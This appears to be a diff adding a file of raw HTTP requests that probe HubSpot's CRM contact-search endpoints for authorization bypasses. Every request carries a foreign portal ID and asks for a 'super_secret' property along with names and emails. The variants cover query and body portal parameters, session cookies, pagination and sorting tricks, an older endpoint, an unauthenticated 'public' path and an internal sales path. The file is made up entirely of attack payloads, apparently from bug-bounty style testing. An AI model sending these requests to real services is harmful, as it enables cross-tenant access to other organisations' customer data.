@@ -1,0 +1,74 @@
+# ========================================
+# SEARCH & FILTER ENDPOINTS - CRITICAL
+# Search endpoints often have authorization bypasses
+# ========================================
+
+# REQUEST 1: Contact Search with Portal Filter
+POST /crm/v3/objects/contacts/search?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"createdate","operator":"GT","value":"0"}]}],"properties":["firstname","super_secret","email"],"limit":100}
+
+
+# REQUEST 2: Search with Portal ID in Body
+POST /crm/v3/objects/contacts/search HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"portalId":"46962361","limit":100}
+
+
+# REQUEST 3: Search via App Domain (session-based)
+POST /api/crm/v3/objects/contacts/search HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"portalId":"46962361","limit":100}
+
+
+# REQUEST 4: Search with After parameter (pagination bypass)
+POST /crm/v3/objects/contacts/search?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"email","operator":"HAS_PROPERTY"}]}],"properties":["firstname","super_secret","email"],"limit":100,"after":"0"}
+
+
+# REQUEST 5: CRM Search (older endpoint)
+POST /crm/v1/objects/contacts/search?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"query":"","properties":["firstname","super_secret","email"],"limit":100}
+
+
+# REQUEST 6: Search with sorts (might bypass caching)
+POST /crm/v3/objects/contacts/search?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[],"sorts":[{"propertyName":"createdate","direction":"DESCENDING"}],"properties":["firstname","super_secret","email"],"limit":100}
+
+
+# REQUEST 7: Public Object Search (if enabled)
+POST /crm/v3/objects/contacts/search/public?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"propertyName":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"limit":10}
+
+
+# REQUEST 8: Sales Views Search (internal)
+POST /api/sales-views/v2/crm-search/contacts?portalId=46962361 HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+{"filterGroups":[{"filters":[{"property":"hs_object_id","operator":"EQ","value":"1"}]}],"properties":["firstname","super_secret","email"],"limit":100}
